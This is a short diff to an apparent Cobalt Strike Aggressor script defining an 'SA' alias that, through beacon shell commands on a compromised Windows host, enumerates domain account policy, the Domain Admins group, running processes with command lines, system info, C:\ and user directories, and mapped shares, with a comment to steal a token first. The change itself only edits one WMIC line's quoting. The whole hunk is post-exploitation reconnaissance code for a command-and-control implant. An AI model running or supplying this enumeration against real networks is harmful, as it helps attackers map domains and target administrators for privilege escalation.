@@ -11,7 +11,7 @@ alias SA {
 	bshell!($1, "echo \c8\Domain Accounts && net accounts /domain");
 	bpause!($1, int(120));	
 	bshell!($1, "echo \c8\Domain Admins && net groups \"domain admins\" /domain");
-	bshell!($1, "echo \c8\WMIC Processes && WMIC PATH win32_process GET Processid,Commandline");
+	bshell!($1, 'WMIC PATH win32_process GET Processid,Commandline');
 	bshell!($1, "echo \c8\System Info && systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\" /C:\"System Boot Time\"");
 	bshell!($1, "echo \c8\Enum C:\ && dir c:\\ && dir c:\\Users");
 	bshell!($1, "echo \c8\Share Drive **Steal Token 1st** && net use");
